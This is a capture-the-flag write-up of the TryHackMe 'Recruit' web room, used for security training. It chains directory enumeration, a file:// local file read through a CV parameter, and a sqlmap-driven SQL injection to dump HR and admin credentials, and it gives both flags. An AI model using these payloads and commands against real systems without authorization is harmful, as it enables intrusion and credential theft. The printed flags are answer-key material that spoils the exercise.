# TryHackMe — Recruit


## Overview

**Recruit** is a web application penetration-testing room focused on vulnerability enumeration and chaining multiple weaknesses together to escalate from an unauthenticated user to administrator access.

The attack chain used throughout the room was:

```text
Reconnaissance
      ↓
Directory Enumeration
      ↓
Information Disclosure
      ↓
Local File Read
      ↓
HR Account Compromise
      ↓
Authenticated SQL Injection
      ↓
Database Enumeration
      ↓
Admin Credential Extraction
      ↓
Administrator Access
```

The two flags obtained were:

```text
THM{LOGGED_IN_USER}
THM{LOGGED_IN_ADM1N1}
```

---

## 1. Reconnaissance

I started with a full TCP port scan combined with service and version detection:

```bash
nmap -sS -vv -p- -A <MACHINE_IP>
```

The main ports discovered were:

| Port | Service | Description |
| ---- | ------- | ----------- |
| 22   | SSH     | OpenSSH     |
| 53   | DNS     | ISC BIND    |
| 80   | HTTP    | Apache      |

Since the web application was running on port `80`, I focused my enumeration there.

The room used the hostname:

```text
recruit.thm
```

I added it to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

and added:

```text
<MACHINE_IP> recruit.thm
```

The application could then be accessed at:

```text
http://recruit.thm
```

---

## 2. Directory Enumeration

The web application initially presented a login page.

Rather than spending too much time guessing credentials, I moved on to directory enumeration using Gobuster:

```bash
gobuster dir -u http://recruit.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

Several interesting directories were discovered:

```text
/mail
/assets
/phpmyadmin
/server-status
```

The `/mail` directory immediately caught my attention because exposed internal communications can often reveal usernames, credentials, or information about the application's infrastructure.

---

## 3. Information Disclosure — `/mail`

I browsed to:

```text
http://recruit.thm/mail/
```

The directory exposed internal mail.

One of the messages contained useful information about the application's authentication system.

The email indicated that:

* The HR account used the username `hr`
* The HR password was stored inside `config.php`
* Administrator credentials were stored in the database

This gave me a clear path to investigate:

```text
Exposed mail
     ↓
config.php
     ↓
HR credentials
     ↓
Database
     ↓
Administrator credentials
```

The next objective was therefore to find a way to read `config.php`.

---

## 4. Investigating the File Functionality

During further enumeration, I found functionality related to retrieving CVs/files.

The application accepted a file or resource through a parameter similar to:

```text
file.php?cv=<URL>
```

Since the application appeared to retrieve the supplied resource itself, I considered whether it could be abused to access resources that should normally be inaccessible.

This led me to test local file access.

---

## 5. Local File Read

I first looked for a way to retrieve the application's `config.php`.

The important part was the use of the `file://` URI scheme.

I tested:

```text
file.php?cv=file://config.php
```

The application returned the contents of the configuration file.

Among the configuration data were the HR credentials:

```text
Username: hr
Password: hrpassword123
```

This gave me valid credentials for the application.

---

## 6. HR Account Access

I returned to the login page and authenticated using:

```text
Username: hr
Password: hrpassword123
```

The login was successful.

After authenticating as the HR user, the application revealed the first flag:

```text
THM{LOGGED_IN_USER}
```

### Flag 1

```text
THM{LOGGED_IN_USER}
```

At this point, I had successfully moved from an unauthenticated attacker to an authenticated application user.

---

## 7. Finding the SQL Injection

The next step was to investigate what functionality was available after authentication.

I found a search-related parameter that interacted with the application's backend.

I tested the parameter with a single quote:

```text
'
```

The application's response changed, indicating that the input was likely being passed into a SQL query without proper sanitization.

This suggested a possible **SQL Injection** vulnerability.

I decided to use Burp Suite to capture the request and then pass the request to SQLMap for further enumeration.

---

## 8. Capturing the Request with Burp Suite

I intercepted the vulnerable request using **Burp Suite**.

The complete request was saved to a file:

```text
request.txt
```

Using the captured request allowed SQLMap to replay the request while preserving the necessary HTTP parameters and authentication session.

---

## 9. Database Enumeration with SQLMap

I started by enumerating the available databases:

```bash
sqlmap -r request.txt -p search --dbs
```

SQLMap identified several databases, including:

```text
information_schema
mysql
performance_schema
phpmyadmin
recruit_db
sys
```

The database that was relevant to the application was:

```text
recruit_db
```

---

## 10. Enumerating Database Tables

I then enumerated the tables inside `recruit_db`:

```bash
sqlmap -r request.txt -p search -D recruit_db --tables
```

Among the discovered tables were:

```text
candidates
users
```

The `users` table was particularly interesting because it was likely to contain application authentication data.

---

## 11. Enumerating the `users` Table

I checked the columns within the `users` table:

```bash
sqlmap -r request.txt -p search -D recruit_db -T users --columns
```

After identifying the table structure, I proceeded to retrieve the database contents.

Since the goal was to obtain administrator access, the `users` table was the main target.

---

## 12. Extracting the Administrator Credentials

I used SQLMap to dump the database contents:

```bash
sqlmap -r request.txt -D recruit_db --dump-all
```

The dump revealed the administrator credentials:

```text
Username: admin
Password: admin@001admin
```

At this point, the attack chain had reached the administrator account.

---

## 13. Administrator Access

I returned to the login page and authenticated using the recovered administrator credentials:

```text
Username: admin
Password: admin@001admin
```

The login was successful and the application displayed the administrator flag:

```text
THM{LOGGED_IN_ADM1N1}
```

### Flag 2

```text
THM{LOGGED_IN_ADM1N1}
```

---

# Attack Chain

The complete attack path was:

```text
Nmap
  ↓
HTTP Service Discovery
  ↓
recruit.thm
  ↓
Gobuster
  ↓
/mail
  ↓
Information Disclosure
  ↓
File Retrieval Functionality
  ↓
file:// Local File Read
  ↓
config.php
  ↓
HR Credentials
  ↓
HR Login
  ↓
THM{LOGGED_IN_USER}
  ↓
SQL Injection
  ↓
Burp Suite
  ↓
SQLMap
  ↓
recruit_db
  ↓
users Table
  ↓
Admin Credentials
  ↓
Administrator Login
  ↓
THM{LOGGED_IN_ADM1N1}
```

---

# Flags

| Account             | Flag                    |
| ------------------- | ----------------------- |
| HR / Logged-in User | `THM{LOGGED_IN_USER}`   |
| Administrator       | `THM{LOGGED_IN_ADM1N1}` |

---

# Tools Used

* **Nmap** — Port, service, and version enumeration
* **Gobuster** — Directory enumeration
* **Burp Suite** — HTTP request interception and analysis
* **SQLMap** — SQL injection exploitation and database enumeration
* **Firefox** — Web application interaction
* **Linux CLI** — General reconnaissance and exploitation

---

# Key Takeaways

## 1. Enumeration comes first

The login page wasn't the end of the investigation.

Directory enumeration revealed `/mail`, which provided information that directly influenced the rest of the attack.

```text
Web Enumeration
      ↓
/mail
      ↓
Useful Information
```

## 2. Information disclosure can be the beginning of an attack chain

The exposed mail did not directly provide administrator access.

Instead, it revealed where sensitive credentials were stored:

```text
/mail
  ↓
config.php
  ↓
HR Credentials
```

This is a good example of why seemingly minor information disclosure vulnerabilities shouldn't be ignored.

## 3. File retrieval functionality should be tested carefully

Applications that accept URLs, filenames, or remote resources should always be examined carefully.

In this case, the functionality could be abused with the `file://` scheme to retrieve a local configuration file.

```text
file.php?cv=file://config.php
```

That exposed credentials that were never intended to be accessible.

## 4. Authentication doesn't mean the application is secure

Obtaining a valid HR account was only the first stage.

Once authenticated, further functionality became available and eventually led to a SQL injection vulnerability.

```text
HR Account
    ↓
SQL Injection
    ↓
Database Access
    ↓
Credential Extraction
    ↓
Admin Account
```

## 5. Vulnerability chaining is extremely powerful

The room demonstrates how multiple relatively simple weaknesses can combine into a complete compromise.

Individually:

```text
Information Disclosure
Local File Read
SQL Injection
Credential Exposure
```

Together:

```text
Unauthenticated Access
        ↓
HR Account
        ↓
Database Access
        ↓
Administrator Account
```

The impact of a vulnerability should therefore be considered in the context of the entire application rather than in isolation.

---

# Conclusion

Recruit was a good demonstration of how a web application can be compromised through a chain of vulnerabilities rather than a single critical flaw.

The attack started with basic reconnaissance and directory enumeration. The exposed `/mail` directory provided information about where credentials were stored, which led to the discovery of a local file read vulnerability. Reading `config.php` provided HR credentials and allowed authenticated access to the application.

From there, a SQL injection vulnerability provided access to the application's database. Enumerating the database eventually exposed the administrator credentials, allowing the final privilege escalation.

The complete chain was:

```text
Reconnaissance
    ↓
Directory Enumeration
    ↓
Information Disclosure
    ↓
Local File Read
    ↓
HR Account Compromise
    ↓
Authenticated SQL Injection
    ↓
Database Enumeration
    ↓
Credential Extraction
    ↓
Administrator Access
```

**Room completed.**
